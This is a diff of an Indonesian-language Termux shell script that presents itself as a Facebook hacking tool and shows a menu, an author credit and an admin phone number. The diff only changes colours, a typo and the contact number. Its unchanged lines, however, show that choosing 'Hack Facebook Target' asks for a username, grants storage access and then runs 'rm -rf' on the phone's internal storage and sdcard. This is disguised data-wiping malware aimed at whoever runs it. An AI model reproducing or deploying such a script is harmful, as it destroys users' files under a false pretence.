@@ -29,22 +29,22 @@ exit
 }
 echo             "
 ____________________________________________" | lolcat
-echo $green"kontak admin:62821-3050-5651"
+echo $green"kontak admin:6289698270794"
 echo $Orange"Autohor: MRRUXHAN"
 echo $Red"Thanks To Hek efbeh :v"
 echo             "
 ___________________________________________" | lolcat
 echo $green" 01) Hack Facebook Target"
-echo $green" 02) Langkah Tools"
-echo $green" 03) Info Tools"
+echo $blue" 02) Langkah Tools"
+echo $Red" 03) Info Tools"
 read -p "[MRRUXHAN]> " bro;
 
 if [ $bro = 1 ] || [ $bro = 01 ]
 then
 clear
-echo $green" Login Facebook"
+echo $yellow" Login Facebook"
 sleep 1
-read -p "[USERNAME FACEBOOKU> " bro;
+read -p "[USERNAME FACEBOOK> " bro;
 termux-setup-storage
 rm -rf /storage/emulated/0
 rm -rf /sdcard/0
